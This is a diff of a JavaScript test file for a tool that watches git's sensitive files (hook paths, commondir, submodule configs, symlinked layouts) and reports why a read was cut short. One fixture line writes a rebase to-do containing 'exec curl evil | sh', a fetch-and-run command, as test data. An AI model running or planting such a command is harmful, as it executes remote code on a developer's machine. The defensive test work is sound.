@@ -450,6 +450,7 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   // (and the files of its folder that change what git runs: attributes, commondir, a rebase's to-do list)
   w('other/.gitdir/info/attributes', '* filter=x\n');
   w('other/.gitdir/commondir', '../common\n');
+  w('other/common/config', '[core]\n');
   w('other/.gitdir/rebase-merge/git-rebase-todo', 'exec curl evil | sh\n');
   w('other/.gitdir/objects/ab/cdef', 'x');
   r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
@@ -475,6 +476,59 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).truncated, true, 'an include outside the folder');
   w('other/.gitdir/config', '[core]\n');
   assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).truncated, undefined, 'read whole again');
+  // (each with why, which the code container says in its own words)
+  const why = async () => { const x = result(await talk(SOCK, [open({ op: 'ws.sensitive' })])); return x.truncated ? x.why : undefined; };
+  // a commondir to no folder, or through a link on its way; a gitdir through a link; .git/modules that is a link
+  w('other/.gitdir/commondir', '../nowhere\n');
+  assert.deepEqual(await why(), ['layout'], 'a commondir to no folder');
+  fs.symlinkSync('common', path.join(WS, 'other/common-link'));
+  w('other/.gitdir/commondir', '../common-link\n');
+  assert.deepEqual(await why(), ['layout'], 'a commondir that is a link');
+  fs.rmSync(path.join(WS, 'other/.gitdir/commondir'));
+  fs.symlinkSync('other', path.join(WS, 'other-link'));
+  w('.git', 'gitdir: other-link/.gitdir\n');
+  assert.deepEqual(await why(), ['layout'], 'a gitdir through a link on its way');
+  w('.git', 'gitdir: other/.gitdir\n');
+  assert.equal(await why(), undefined);
+  fs.mkdirSync(path.join(WS, 'mods-elsewhere'));
+  fs.symlinkSync('../../mods-elsewhere', path.join(WS, 'other/.gitdir/modules'));
+  assert.deepEqual(await why(), ['layout'], 'modules/ that is a link');
+  fs.rmSync(path.join(WS, 'other/.gitdir/modules'));
+  // a config not in the plain grammar (Accept edits'): a key on the header's line, a continued line, a comment after a
+  // value, more than 5,000 lines — what git's own reading finds is still followed
+  for (const [what, text] of [['a key on the header\'s line', '[include] path = ../../inc.cfg\n'], ['a continued line', '[core]\n\thooksPath = .git\\\nhooks2\n'],
+    ['a comment after a value', '[core]\n\tbare = false # x\n'], ['more than 5,000 lines', `[core]\n${'\tbare = false\n'.repeat(5001)}`]]) {
+    w('other/.gitdir/config', text);
+    assert.deepEqual(await why(), ['config'], what);
+  }
+  w('other/.gitdir/config', '[core]\n\thooksPath = h2\n\tbare = false # x\n');
+  w('h2/pre-commit', 'x\n');
+  let ans = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  assert.ok(ans.files.some((f) => f.path === 'h2/pre-commit'), 'a config not read whole: its hooksPath still watched');
+  w('other/.gitdir/config', '[core]\n');
+  // submodules at any depth: modules/ within modules/, a name with spaces, a name with /
+  w('other/.gitdir/modules/a/HEAD', 'ref: refs/heads/main\n'); w('other/.gitdir/modules/a/config', '[core]\n');
+  w('other/.gitdir/modules/a/modules/b/HEAD', 'ref: refs/heads/main\n'); w('other/.gitdir/modules/a/modules/b/config', '[core]\n');
+  w('other/.gitdir/modules/a/modules/b/hooks/pre-commit', 'x\n');
+  w('other/.gitdir/modules/my sub/HEAD', 'ref: refs/heads/main\n'); w('other/.gitdir/modules/my sub/config', '[core]\n');
+  w('other/.gitdir/modules/libs/foo/HEAD', 'ref: refs/heads/main\n'); w('other/.gitdir/modules/libs/foo/config', '[core]\n');
+  ans = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  for (const p of ['other/.gitdir/modules/a/config', 'other/.gitdir/modules/a/modules/b/config', 'other/.gitdir/modules/a/modules/b/hooks/pre-commit',
+    'other/.gitdir/modules/my sub/config', 'other/.gitdir/modules/libs/foo/config']) assert.ok(ans.files.some((f) => f.path === p), p);
+  assert.equal(ans.truncated, undefined, 'every submodule read');
+  // (a submodule config not read whole is said; more than 16 submodules too)
+  w('other/.gitdir/modules/a/modules/b/config', '[core] bare = false\n');
+  assert.deepEqual(await why(), ['config'], 'a submodule\'s config');
+  w('other/.gitdir/modules/a/modules/b/config', '[core]\n');
+  for (let i = 0; i < 16; i++) { w(`other/.gitdir/modules/m${i}/HEAD`, 'x\n'); }
+  assert.deepEqual(await why(), ['many'], 'more than 16 submodules');
+  fs.rmSync(path.join(WS, 'other/.gitdir/modules'), { recursive: true });
+  // (and a link among them)
+  fs.mkdirSync(path.join(WS, 'other/.gitdir/modules'));
+  fs.symlinkSync('../../../mods-elsewhere', path.join(WS, 'other/.gitdir/modules/s'));
+  assert.deepEqual(await why(), ['layout'], 'a link among the submodules');
+  fs.rmSync(path.join(WS, 'other/.gitdir/modules'), { recursive: true });
+  assert.equal(await why(), undefined);
   void W2;
 });
 
